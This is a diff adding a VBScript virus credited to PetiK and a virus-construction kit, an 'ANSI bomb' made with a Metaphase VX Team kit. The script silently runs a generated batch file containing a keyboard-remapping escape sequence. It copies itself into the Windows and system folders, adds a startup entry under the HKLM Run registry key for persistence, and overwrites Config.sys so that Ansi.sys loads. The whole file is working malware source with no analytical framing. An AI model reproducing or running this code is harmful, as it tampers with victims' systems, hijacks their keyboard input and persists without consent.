@@ -1,0 +1,28 @@
+   On Error Resume Next
+   'Ansi.VBS.EMM.BoomWin32
+   'By PetiK
+   'Made With Boom Win32 Ansi Bomb Kit 1.1K By -KD- [Metaphase VX Team & NoMercyVirusTeam]
+   'For more info please read the Copyrite in the -About- Boom Win32 Ansi Bomb Kit.
+   '-------- Do Not Edit Above This Line --------
+   Dim EMMWSHShell, EMMFSO, MyEMM, EMMGetDrive
+   Dim EMMTWinDir, EMMBat, EMMSysDir, EMMConfig
+   Set EMMWSHShell = CreateObject("WScript.Shell")
+   Set EMMFSO = CreateObject("Scripting.FileSystemObject")
+   MyEMM = Wscript.ScriptFullName
+   Set EMMTWinDir = EMMFSO.GetSpecialFolder(0)
+   Set EMMBat = EMMFSO.CreateTextFile("EMM.bat", 2, False)
+   EMMBat.WriteLine "@Echo On"
+   EMMBat.WriteLine "[" & chr(34) & "y" & chr(34) & ";" & chr(34) & "n" & chr(34) & ";13p"
+   EMMBat.WriteLine "Echo y| Copy %0 %WinDir%\WinStart.bat >Nul"
+   EMMBat.Close
+   EMMWSHShell.Run ("EMM.bat"), VbHide
+   EMMFSO.DeleteFile ("EMM.bat")
+   EMMFSO.CopyFile MyEMM, EMMTWinDir & Chr(92) & "MyEMM.vbs"
+   EMMWSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Startup", EMMTWinDir & "\MyEMM.vbs"
+   Set EMMSysDir = EMMFSO.GetSpecialFolder(1)
+   EMMGetDrive = EMMFSO.GetDriveName(EMMSysDir)
+   EMMFSO.CopyFile EMMSysDir & Chr(92) & "Ansi.sys", EMMGetDrive & Chr(92) & "Ansi.sys"
+   EMMFSO.CopyFile EMMTWinDir & Chr(92) & "Command" & Chr(92) & "Ansi.sys", EMMGetDrive & Chr(92) & "Ansi.sys"
+   Set EMMConfig = EMMFSO.CreateTextFile(EMMGetDrive & Chr(92) & "Config.sys", 2, False)
+   EMMConfig.WriteLine EMMGetDrive & Chr(92) & "Ansi.sys"
+   EMMConfig.Close
